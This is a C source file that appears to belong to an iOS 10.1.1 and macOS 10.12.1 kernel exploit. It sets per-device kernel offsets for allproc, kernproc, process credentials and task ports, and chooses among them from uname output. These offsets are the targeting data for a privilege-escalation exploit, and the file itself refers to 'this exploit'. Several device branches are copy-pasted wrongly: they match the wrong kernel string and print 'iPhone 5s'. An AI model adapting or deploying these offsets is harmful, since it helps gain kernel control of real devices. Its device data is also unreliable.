#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/utsname.h>

#include "offsets.h"

// offsets from the main kernel 0xfeedfacf
uint64_t allproc_offset;
uint64_t kernproc_offset;

// offsets in struct proc
uint64_t struct_proc_p_pid_offset;
uint64_t struct_proc_task_offset;
uint64_t struct_proc_p_uthlist_offset;
uint64_t struct_proc_p_ucred_offset;
uint64_t struct_proc_p_comm_offset;

// offsets in struct kauth_cred
uint64_t struct_kauth_cred_cr_ref_offset;

// offsets in struct uthread
uint64_t struct_uthread_uu_ucred_offset;
uint64_t struct_uthread_uu_list_offset;

// offsets in struct task
uint64_t struct_task_ref_count_offset;
uint64_t struct_task_itk_space_offset;

// offsets in struct ipc_space
uint64_t struct_ipc_space_is_table_offset;

// offsets in struct ipc_port
uint64_t struct_ipc_port_ip_kobject_offset;


void init_ipad_mini_2_10_1_1_14b100() {
  printf("setting offsets for iPad mini 2 10.1.1\n");
  allproc_offset = 0x5A4128;
  kernproc_offset = 0x5AA0E0;

  struct_proc_p_pid_offset = 0x10;
  struct_proc_task_offset = 0x18;
  struct_proc_p_uthlist_offset = 0x98;
  struct_proc_p_ucred_offset = 0x100;
  struct_proc_p_comm_offset = 0x26c;
  
  struct_kauth_cred_cr_ref_offset = 0x10;
  
  struct_uthread_uu_ucred_offset = 0x168;
  struct_uthread_uu_list_offset = 0x170;
  
  struct_task_ref_count_offset = 0x10;
  struct_task_itk_space_offset = 0x300;
  
  struct_ipc_space_is_table_offset = 0x20;
  
  struct_ipc_port_ip_kobject_offset = 0x68;
}

void init_ipod_touch_6g_10_1_1_14b100() {
  printf("setting offsets for iPod touch 6G 10.1.1\n");
  allproc_offset = 0x5B4168;
  kernproc_offset = 0x5BA0E0;

  struct_proc_p_pid_offset = 0x10;
  struct_proc_task_offset = 0x18;
  struct_proc_p_uthlist_offset = 0x98;
  struct_proc_p_ucred_offset = 0x100;
  struct_proc_p_comm_offset = 0x26c;
  
  struct_kauth_cred_cr_ref_offset = 0x10;
  
  struct_uthread_uu_ucred_offset = 0x168;
  struct_uthread_uu_list_offset = 0x170;
  
  struct_task_ref_count_offset = 0x10;
  struct_task_itk_space_offset = 0x300;
  
  struct_ipc_space_is_table_offset = 0x20;
  
  struct_ipc_port_ip_kobject_offset = 0x68;
}

void init_iphone_5s_10_1_1_14b100() {
    printf("setting offsets for iPhone 5s 10.1.1\n");
    allproc_offset = 0x5A4128;
    kernproc_offset = 0x5AA0E0;
    
    struct_proc_p_pid_offset = 0x10;
    struct_proc_task_offset = 0x18;
    struct_proc_p_uthlist_offset = 0x98;
    struct_proc_p_ucred_offset = 0x100;
    struct_proc_p_comm_offset = 0x26c;
    
    struct_kauth_cred_cr_ref_offset = 0x10;
    
    struct_uthread_uu_ucred_offset = 0x168;
    struct_uthread_uu_list_offset = 0x170;
    
    struct_task_ref_count_offset = 0x10;
    struct_task_itk_space_offset = 0x300;
    
    struct_ipc_space_is_table_offset = 0x20;
    
    struct_ipc_port_ip_kobject_offset = 0x68;
}

void init_iphone_7plus_10_1_1_14b100() {
    printf("setting offsets for iPhone 7 10.1.1\n");
    allproc_offset = 0x5EC000;
    kernproc_offset = 0x5F2000;
    
    struct_proc_p_pid_offset = 0x10;
    struct_proc_task_offset = 0x18;
    struct_proc_p_uthlist_offset = 0x98;
    struct_proc_p_ucred_offset = 0x100;
    struct_proc_p_comm_offset = 0x26c;
    
    struct_kauth_cred_cr_ref_offset = 0x10;
    
    struct_uthread_uu_ucred_offset = 0x168;
    struct_uthread_uu_list_offset = 0x170;
    
    struct_task_ref_count_offset = 0x10;
    struct_task_itk_space_offset = 0x300;
    
    struct_ipc_space_is_table_offset = 0x20;
    
    struct_ipc_port_ip_kobject_offset = 0x68;
}

void init_iphone_6plus_10_1_1_14b100() {
    printf("setting offsets for iPhone 6 Plus 10.1.1\n");
    allproc_offset = 0x5B4168;
    kernproc_offset = 0x5BA0E0;
    
    struct_proc_p_pid_offset = 0x10;
    struct_proc_task_offset = 0x18;
    struct_proc_p_uthlist_offset = 0x98;
    struct_proc_p_ucred_offset = 0x100;
    struct_proc_p_comm_offset = 0x26c;
    
    struct_kauth_cred_cr_ref_offset = 0x10;
    
    struct_uthread_uu_ucred_offset = 0x168;
    struct_uthread_uu_list_offset = 0x170;
    
    struct_task_ref_count_offset = 0x10;
    struct_task_itk_space_offset = 0x300;
    
    struct_ipc_space_is_table_offset = 0x20;
    
    struct_ipc_port_ip_kobject_offset = 0x68;
}

void init_ipad_air_2_wifi_10_1_1_14b100() {
    printf("setting offsets for iPad air 2 Wifi Only 10.1.1\n");
    allproc_offset = 0x5B4228;
    kernproc_offset = 0x5BA0E0;
    
    struct_proc_p_pid_offset = 0x10;
    struct_proc_task_offset = 0x18;
    struct_proc_p_uthlist_offset = 0x98;
    struct_proc_p_ucred_offset = 0x100;
    struct_proc_p_comm_offset = 0x26c;
    
    struct_kauth_cred_cr_ref_offset = 0x10;
    
    struct_uthread_uu_ucred_offset = 0x168;
    struct_uthread_uu_list_offset = 0x170;
    
    struct_task_ref_count_offset = 0x10;
    struct_task_itk_space_offset = 0x300;
    
    struct_ipc_space_is_table_offset = 0x20;
    
    struct_ipc_port_ip_kobject_offset = 0x68;
}

void init_iphone_6_10_1_1_14b100() {
    printf("setting offsets for iPhone 6 10.1.1\n");
    allproc_offset = 0x5B4168;
    kernproc_offset = 0x5BA0E0;
    
    struct_proc_p_pid_offset = 0x10;
    struct_proc_task_offset = 0x18;
    struct_proc_p_uthlist_offset = 0x98;
    struct_proc_p_ucred_offset = 0x100;
    struct_proc_p_comm_offset = 0x26c;
    
    struct_kauth_cred_cr_ref_offset = 0x10;
    
    struct_uthread_uu_ucred_offset = 0x168;
    struct_uthread_uu_list_offset = 0x170;
    
    struct_task_ref_count_offset = 0x10;
    struct_task_itk_space_offset = 0x300;
    
    struct_ipc_space_is_table_offset = 0x20;
    
    struct_ipc_port_ip_kobject_offset = 0x68;
}


void init_macos_10_12_1() {
  printf("setting offsets for MacOS 10.12.1\n");
  allproc_offset = 0x8bb490;
  kernproc_offset = 0x8BA7D8;
  
  struct_proc_task_offset = 0x18;
  struct_proc_p_uthlist_offset = 0x98;
  struct_proc_p_ucred_offset = 0xe8;
  struct_proc_p_comm_offset = 0x2e4;
  
  struct_kauth_cred_cr_ref_offset = 0x10;
  
  struct_uthread_uu_ucred_offset = 0x168;
  struct_uthread_uu_list_offset = 0x170;
  
  struct_task_ref_count_offset = 0x10;
  struct_task_itk_space_offset = 0x300;
  
  struct_ipc_space_is_table_offset = 0x18;
  
  struct_ipc_port_ip_kobject_offset = 0x68;
}

void unknown_build() {
  printf("This is an unknown kernel build - the offsets are likely to be incorrect and it's very unlikely this exploit will work\n");
  printf("You need to find these two kernel symbols:\n");
  printf("  allproc\n");
  printf("  kernproc\n\n");
  printf("and update the code\n");
}

void init_offsets() {
  struct utsname u = {0};
  int err = uname(&u);
  if (err == -1) {
    printf("uname failed - what platform is this?\n");
    printf("there's no way this will work, but trying anyway!\n");
    init_ipad_mini_2_10_1_1_14b100();
    return;
  }

  printf("sysname: %s\n", u.sysname);
  printf("nodename: %s\n", u.nodename);
  printf("release: %s\n", u.release);
  printf("version: %s\n", u.version);
  printf("machine: %s\n", u.machine);

  if (strstr(u.machine, "iPod7,1")) {
    // this is an iPod 6G
    if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
      printf("this is a known kernel build for iPod touch 6G - offsets should be okay\n");
    } else {
      unknown_build();
    }
    init_ipod_touch_6g_10_1_1_14b100();
    return;
  }
  if (strstr(u.machine, "iPad4,4")) {
    // this is an iPad mini 2
    if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")){
      printf("this is a known kernel build for iPad mini 2 - offsets should be okay\n");
    } else {
      unknown_build();
    }
    init_ipad_mini_2_10_1_1_14b100();
    return;
  }
    if (strstr(u.machine, "iPhone6,1")) {
        // this is an iPhone 5s
        if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")){
            printf("this is a known kernel build for iPhone 5s - offsets should be okay\n");
        } else {
            unknown_build();
        }
        init_iphone_5s_10_1_1_14b100();
        return;
    }
    
    if (strstr(u.machine, "iPhone9,2")) {
        // this is an iPhone 7 Plus
        if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")){
            printf("this is a known kernel build for iPhone 5s - offsets should be okay\n");
        } else {
            unknown_build();
        }
        init_iphone_7plus_10_1_1_14b100();
        return;
    }
    if (strstr(u.machine, "iPhone8,2")) {
        // this is an iPhone 6 Plus
        if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")){
            printf("this is a known kernel build for iPhone 5s - offsets should be okay\n");
        } else {
            unknown_build();
        }
        init_iphone_6plus_10_1_1_14b100();
        return;
    }
    
    if (strstr(u.machine, "iPad5,3")) {
        // this is an iPad Air 2
        if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")){
            printf("this is a known kernel build for iPhone 5s - offsets should be okay\n");
        } else {
            unknown_build();
        }
        init_ipad_air_2_wifi_10_1_1_14b100();
        return;
    }
    if (strstr(u.machine, "iPhone7,2")) {
        // this is an iPhone 6
        if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")){
            printf("this is a known kernel build for iPhone 5s - offsets should be okay\n");
        } else {
            unknown_build();
        }
        init_iphone_6_10_1_1_14b100();
        return;
    }
    
  printf("don't recognize this platform\n");
  unknown_build();
  init_ipad_mini_2_10_1_1_14b100(); // this won't work!
}


